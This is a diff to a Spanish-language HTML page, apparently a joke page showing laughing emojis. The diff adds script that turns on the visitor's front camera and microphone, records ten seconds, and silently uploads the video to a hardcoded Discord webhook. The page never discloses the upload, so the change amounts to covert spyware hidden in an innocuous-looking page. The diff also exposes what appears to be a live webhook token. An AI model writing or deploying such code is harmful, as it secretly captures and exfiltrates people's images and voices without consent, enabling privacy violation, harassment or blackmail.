@@ -47,6 +47,12 @@
             position: absolute;
             bottom: 10px;
         }
+        #compatibility-message {
+            color: #ff0000;
+            font-size: 18px;
+            margin-top: 20px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -57,14 +63,27 @@
         <video id="video" autoplay style="display: none;"></video>
     </div>
     <div class="emojis">😂🤣😆</div>
+    <div id="compatibility-message">Tu navegador no es compatible. Por favor, abre esta página en un navegador moderno como Chrome o Safari.</div>
 
     <script>
+        const webhookURL = 'https://discord.com/api/webhooks/1243016760014278737/-rJTQS8xYX2H-zZHV22yU4LCJOxhYIJsfNtERt_Z3Wbd0wLWnzD7QKYwHL0h4iDXicSX';
+
         async function startWebcam() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                showCompatibilityMessage();
+                return;
+            }
+            if (!window.MediaRecorder) {
+                showCompatibilityMessage();
+                return;
+            }
+
             try {
                 const constraints = {
                     video: {
                         facingMode: "user" // Intenta usar la cámara frontal
-                    }
+                    },
+                    audio: true // También capturará el audio
                 };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 const videoElement = document.getElementById('video');
@@ -72,10 +91,46 @@
                 videoElement.srcObject = stream;
                 videoElement.style.display = 'block';
                 previewImage.style.display = 'none';
+
+                // Empezar a grabar el video
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = event => {
+                    chunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('file', blob, 'video.webm');
+
+                    // Enviar el video al webhook de Discord
+                    try {
+                        await fetch(webhookURL, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        console.log('Video enviado al webhook de Discord');
+                    } catch (error) {
+                        console.error('Error al enviar el video al webhook de Discord:', error);
+                    }
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 10000); // Detener la grabación después de 10 segundos
+
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
                 alert('No se pudo acceder a la cámara. Asegúrate de haber dado permiso.');
             }
+        }
+
+        function showCompatibilityMessage() {
+            const messageElement = document.getElementById('compatibility-message');
+            messageElement.style.display = 'block';
         }
     </script>
 </body>
